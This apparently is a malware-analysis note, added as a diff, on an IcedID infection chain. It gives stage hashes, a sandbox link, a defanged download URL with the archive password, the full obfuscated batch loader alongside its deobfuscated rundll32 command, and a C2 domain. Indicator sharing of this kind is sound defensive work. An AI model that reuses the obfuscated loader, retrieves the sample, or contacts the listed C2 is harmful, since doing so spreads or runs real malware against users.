@@ -1,0 +1,97 @@
+IcedID | 3021898880 | 2022.09.01
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.zip e94d199d1aae4bb846ba8ba50b5e1cd0ebf1b53230053af1d2e2a39c3f923f90 (090122)
+.iso B61EAA4F6BEBD711D1C60AEDA57D06186995D2FE957FEFF8DD1D0034413ED89F
+.lnk FF91FC58429A34C16D4132BD0B6997911476858AE15193A17661651ADF58F38B
+.bat 4EE42F1642ACC1004E5DE4D3297AE147F24BC991F2B8E74267EA7F958F5DB040
+.dll 965DE4076AEFF1EB32A91C423C5BA2F25FDA970572F0A0837AAC629ECFC49DC1
+
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://private.tria.ge/220901-sxsn9alsvm/behavioral2
+
+
+# --------------------------------------------------------- #
+# ---------------------- CREDENTIAL ----------------------- #
+# --------------------------------------------------------- #
+hxxps://drive[.]google[.]com/uc?id=1vgfce4auGei3zkfO6i1F3Ioktos1Q_FT&export=download
+password == 43764
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+.zip
+    .iso
+        .bat
+            @echo off
+            :znodxrbcemv
+            set soitky=r
+            :kfbtorgehnj
+            set vndbzf=x
+            :lxicbayqszn
+            set tasykg=k
+            :ukotxpgfrqj
+            set lrjfdz=i
+            :wdeilvagxzr
+            set qacurb=q
+            :uohbekqigty
+            set yhwqxt=e
+            :zpmasxnbrlt
+            set oenbvz=z
+            :ogewyjcnauh
+            set psiyad=l
+            :lbxiszekvwd
+            set rbjgoc=b
+            :mygacjfzrke
+            set samdzo=p
+            :ltvxwspmouc
+            set uqwack=o
+            :fzebvnixgtp
+            set tpdvwn=t
+            :sdukleczajv
+            set ciqxrt=y
+            :mrfyqnoebhs
+            set gwuysr=d
+            :kjxuzycmnit
+            set zmvtfk=j
+            :bakjophzeqm
+            set lanrdw=h
+            :viulaypgfoz
+            set stybmc=m
+            :jdqeurlxwnh
+            set fxgazo=n
+            :ygdcqkstbmr
+            set vnhwsf=u
+            :anfplzoxywu
+            set udtipy=a
+            :vdrebcshxyf
+            set mvobkd=f
+            :qktdnzvbgia
+            set yljtsn=g
+            :peuktqcjnyz
+            set hcpgwx=w
+            :fgiwodrsqhp
+            set tizdym=v
+            :kmtexjiroaf
+            set hgqlze=s
+            :qsudyvbtloi
+            set mdrixo=c
+            :zmgrxqsjdhb
+            :GK%mvobkd%%samdzo%%yhwqxt%%tizdym%XL%uqwack%%psiyad%KSECO%tasykg%S%hgqlze%%tasykg%%ciqxrt%ER%soitky%JML%gwuysr%C%udtipy%
+            %soitky%%vnhwsf%%fxgazo%%gwuysr%%psiyad%%psiyad%32 %lrjfdz%%psiyad%%psiyad%\%stybmc%%lrjfdz%%hgqlze%%soitky%%yhwqxt%%stybmc%%yhwqxt%%stybmc%%rbjgoc%%yhwqxt%%soitky%%lrjfdz%%fxgazo%%yljtsn%.%gwuysr%%psiyad%%psiyad%,#1
+            :CV%mdrixo%U%fxgazo%Z%tasykg%M%soitky%WEDNWO%samdzo%PK%stybmc%Y%zmvtfk%%stybmc%B%mvobkd%%soitky%%yhwqxt%%gwuysr%%tpdvwn%%tasykg%E%soitky%%soitky%%hcpgwx%F%tasykg%
+            [Deobfuscated: rundll32 ill\misremembering.dll,#1]
+
+            rundll32.exe ill\misremembering.dll,#1
+
+
+# --------------------------------------------------------- #
+# -------------------------- C2s -------------------------- #
+# --------------------------------------------------------- #
+donorcabr.com
+
